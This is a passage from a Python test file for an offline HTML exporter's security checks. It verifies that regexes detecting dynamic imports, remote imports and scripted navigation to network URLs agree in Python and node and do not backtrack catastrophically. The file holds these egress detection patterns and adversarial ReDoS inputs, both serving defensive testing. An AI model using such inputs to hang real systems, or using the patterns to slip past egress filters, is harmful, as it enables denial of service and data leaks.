                         % (len(verdicts.get("benign", [])), len(self._NAV_CORPUS_BENIGN)))
        for sample, hit in zip(self._NAV_CORPUS_NAVIGATES, verdicts["navigates"]):
            self.assertTrue(hit, "the REAL JS engine does not strip %r, so the exporter ships a "
                                 "beacon the Python validator rejects" % sample)
            self.assertTrue(resources.offline_script_navigates_to_network(sample),
                            "the validator does not reject %r" % sample)
        for sample, hit in zip(self._NAV_CORPUS_BENIGN, verdicts["benign"]):
            self.assertFalse(hit, "the REAL JS engine deletes the benign script %r" % sample)
            self.assertFalse(resources.offline_script_navigates_to_network(sample),
                              "the validator rejects the benign script %r" % sample)

    def test_the_navigation_pattern_cannot_be_made_to_backtrack(self):
        """The pattern must stay linear on adversarial input, in BOTH engines.

        It runs over every executable inline script of an offline document - which can include a
        multi-megabyte inlined mermaid bundle - on every `validate.py --strict`, and the exporter
        runs it on every export. Its prefix chain once joined two unbounded whitespace runs around
        an optional `?` (`WS*\\??WS*\\.`), so a whitespace run never followed by a dot made the
        engine try every split: a 20k-space input took ~2.7s in Python and ~10s in node, which is a
        denial of service on an attacker-authored document (and an accidental hang on a minified
        one). The `?` is now bound inside its own group, so each position consumes the run         one way. A second shape amplified the same way: several almost-matching sink segments whose
        tail never reaches a URL (`window<sp>.<sp>top<sp>.<sp>location<sp>.<sp>href<sp>=<sp>'x'`)
        took 18s in node at 200 spaces per gap. Both are checked here.
        """
        evils = [
            "window" + " " * 20000 + "X",
            ("window{0}.{0}top{0}.{0}location{0}.{0}href{0}={0}'not-a-url'").format(" " * 400),
            "window . " * 200 + "x",
        ]
        for evil in evils:
            start = time.monotonic()
            self.assertIsNone(resources.OFFLINE_NAV_TO_NETWORK_RE.search(evil))
            elapsed = time.monotonic() - start
            self.assertLess(
                elapsed, 1.0,
                "the navigation pattern took %.2fs on a %d-character adversarial input - it is "
                "backtracking. Look for two unbounded repetitions that can consume the same input "
                "(the historical shape was `WS*\\??WS*\\.`); bind the optional part in its own "
                "group." % (elapsed, len(evil)))
        node = shutil.which("node")
        if not node:
            return
        script = (
            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);const re=new RegExp(p.pattern,'i');"
            "const out=p.evils.map(e=>{const t=Date.now();const hit=re.test(e);"
            "return {ms:Date.now()-t,hit:hit};});"
            "process.stdout.write(JSON.stringify(out));});"
        )
        payload = {"pattern": self._runtime_nav_pattern(), "evils": evils}
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0, "node could not run the pattern: %s" % proc.stderr)
        results = json.loads(proc.stdout)
        self.assertEqual(len(results), len(evils))
        for evil, result in zip(evils, results):
            self.assertFalse(result["hit"])
            self.assertLess(result["ms"], 1000,
                            "the REAL JS engine took %dms on a %d-character adversarial input - "
                            "the exporter would hang the reviewer's browser tab on an "
                            "attacker-authored document" % (result["ms"], len(evil)))

    def test_the_layer_script_survives_its_own_offline_strips(self):
        """The review layer's own script is stripped by the same pass as any other inline script.

        It carries no id the strip skips and is not exempt, so the moment the layer's SOURCE (code
        or a code COMMENT) contains one of the shapes the strip looks for, the exporter deletes the
        runtime from every offline file it writes. That is not hypothetical: a comment added while
        building this very check spelled out both an `import` call and a navigation to a URL
        literal, and every offline export silently came out with an empty JS region. Pin it here,
        where the message names the cause, instead of leaving a whole browser suite to fail with
        "JS region has no closing script tag".
        """
        js_dir = os.path.join(_paths.DEV, "assets", "js")
        sources = {
            "the layer source partials (assets/js/*.js)":
                "\n".join(self._read(name) for name in sorted(os.listdir(js_dir))
                          if name.endswith(".js")),
        }
        # Also check the BUILT layer, not only the concatenated partials: the build could add a
        # prologue or reorder, and it is the built bytes that actually ship inside every export.
        # Required, not best-effort - making it conditional would let the only shipped-bytes check
        # silently vanish in exactly the environment where the build is broken.
        built = os.path.join(_paths.DEV, "skill", "dist", "commentable-html.js")
        self.assertTrue(os.path.exists(built),
                        "the built layer is missing at %s - run `python scripts/rebuild_all.py`; "
                        "this guard must check the bytes that actually ship, not only the source "
                        "partials" % built)
        with open(built, "r", encoding="utf-8", newline="") as fh:
            sources["the BUILT layer (skill/dist/commentable-html.js)"] = fh.read()
        # A sufficient condition, mirroring `_offlineScriptHasNetworkEgress`: the layer is full of
        # https literals (its own site and repo links), so its safety rests entirely on containing
        # no dynamic-import call and no navigation to a URL literal.
        forbidden = [
            (re.compile(r"\bimport\s*\("),
             "a dynamic import call (the strip's second import term pairs it with any quoted "
             "network URL literal, and the layer has several)"),
            (re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE), "a remote `from` import"),
            (re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE), "a bare remote import"),
            (resources.OFFLINE_NAV_TO_NETWORK_RE, "a scripted navigation to a network URL"),
        ]
        for label, body in sources.items():
            for rx, what in forbidden:
                hit = rx.search(body)
                self.assertIsNone(
                    hit, "%s now contains %s (near %r). The offline export strips its OWN script "
                         "with that test, so every offline file would ship without the runtime. "
                         "Reword the comment, or restructure the code." % (
                             label, what,
                             body[max(0, (hit.start() if hit else 0) - 60):
                                  (hit.end() if hit else 0) + 60]))

    def test_the_vendored_bundles_pass_the_offline_capture_gates(self):
        """The re-export fallback runs the captured library through the same content gates it
        applies to any other candidate, so the VENDORED bytes must satisfy them.

        Both gates are cheap today only because the bundles happen to be clean. That is a property
        of the vendored files, not of the code, so a routine `mermaid` / `Chart.js` upgrade could
        silently make a legitimate re-export fail with the exact "missing the vendored bundle"
        toast this feature exists to remove. Pin it here, where a dependency bump trips it, rather
        than in a browser test nobody connects to the upgrade.
        """
        source = self._read("68-export-offline.js")
        start = source.find("function _offlineScriptHasNetworkImport")
        self.assertNotEqual(start, -1, "the runtime no longer defines _offlineScriptHasNetworkImport")
        body = source[start:source.find("\n}", start)]
        patterns = re.findall(r"/((?:[^/\\\n]|\\.)+)/i?\.test\(src\)", body)
        self.assertEqual(
            len(patterns), 5,
            "_offlineScriptHasNetworkImport no longer has exactly 5 regex terms (found %d). The "
            "sufficient condition asserted below was derived from those terms; re-derive it."
            % len(patterns))

        # Assert a SUFFICIENT condition rather than re-evaluating the predicate: every one of its
        # terms requires a dynamic `import(` or a remote `from`/`import` string literal, so a bundle
        # with none of those cannot match any term. (Checking the terms individually would be
        # wrong - one of them is a conjunction, and its URL-literal half matches an innocuous
        # xlink namespace string inside mermaid.) The gate is now import OR NAVIGATION
        # (`_offlineScriptHasNetworkEgress`), so the navigation pattern is evaluated directly here
        # too: a bundle that ever tripped it would make a legitimate re-export fail loudly AND make
        # `validate.py --strict` reject the very file the exporter produced (the strict check scans
        # every executable inline script, and the library is appended after the strips run).
        blockers = [
            re.compile(r"\bimport\s*\("),
            re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE),
            re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE),
            resources.OFFLINE_NAV_TO_NETWORK_RE,
        ]
        vendor = os.path.join(_paths.DEV, "assets", "vendor")
        for name in ("mermaid.min.js", "chart.umd.min.js"):
            path = os.path.join(vendor, name)
            self.assertTrue(os.path.exists(path), "missing vendored bundle %s" % path)
            with open(path, "r", encoding="utf-8", newline="") as fh:
                code = fh.read()
            for rx in blockers:
                self.assertIsNone(
                    rx.search(code),
                    "%s now contains %r, so it can trip the offline network-import check and the "
                    "re-export capture gate would REJECT the genuine library - a re-export would "
                    "fail loudly with 'missing the vendored bundle'. Re-check the bundle, or "
                    "narrow that check." % (name, rx.pattern))
            # `<script` (and an end tag) would open a script-data escape in the re-emitted element;
            # a bare `<!--` is harmless on its own, and mermaid legitimately contains one.
            self.assertIsNone(
                re.search(r"<\/?script|<\/style", code, re.IGNORECASE),
                "%s now contains a script-data escape sequence, so the re-export capture gate "
                "would reject the genuine library." % name)


if __name__ == "__main__":
    unittest.main()
